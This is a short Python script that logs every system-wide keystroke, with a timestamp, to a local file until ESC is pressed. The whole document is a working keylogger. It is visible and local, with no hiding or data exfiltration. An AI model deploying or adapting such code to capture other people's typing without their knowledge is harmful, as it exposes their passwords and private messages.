import keyboard
import datetime

log_file = "keystrokes.log"

def on_key_press(event):
    # Get the current time
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Prepare the log entry
    if event.name == 'space':
        key = ' '
    elif event.name == 'enter':
        key = '[ENTER]'
    elif event.name == 'tab':
        key = '[TAB]'
    elif len(event.name) > 1:  # For special keys
        key = f'[{event.name.upper()}]'
    else:
        key = event.name

    log_entry = f"{current_time} - {key}\n"

    # Write the log entry to the file
    try:
        with open(log_file, "a") as f:
            f.write(log_entry)
    except Exception as e:
        print(f"Error writing to log file: {e}")

# Start listening to keyboard events
keyboard.on_press(on_key_press)

print("Keystroke logging started. Press ESC to stop.")

# Keep the program running until ESC is pressed
keyboard.wait('esc')
print("Keystroke logging stopped.")